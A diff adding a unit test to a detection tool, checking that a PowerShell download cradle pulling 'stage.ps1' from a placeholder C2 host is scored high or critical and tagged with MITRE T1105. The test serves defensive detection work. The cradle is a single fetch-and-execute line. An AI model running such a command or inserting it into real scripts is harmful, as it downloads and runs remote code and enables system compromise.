@@ -99,6 +99,14 @@ class TestBehavioralClassifierAndVerdictScoring(unittest.TestCase):
             ])
         self.assertEqual(code_ok, 0)
 
+    def test_real_download_cradle_scores_high_or_critical(self) -> None:
+        cmd = "IEX (New-Object Net.WebClient).DownloadString('http://c2.evil.example:8080/stage.ps1')"
+        verdict = unmask_command(cmd)
+        self.assertIn(verdict.severity, (Severity.HIGH, Severity.CRITICAL))
+        self.assertGreaterEqual(verdict.risk_score, 60)
+        mitre_ids = {m.mitre_id for m in verdict.behavioral_matches}
+        self.assertIn("T1105", mitre_ids)
+
 
 if __name__ == "__main__":
     unittest.main()
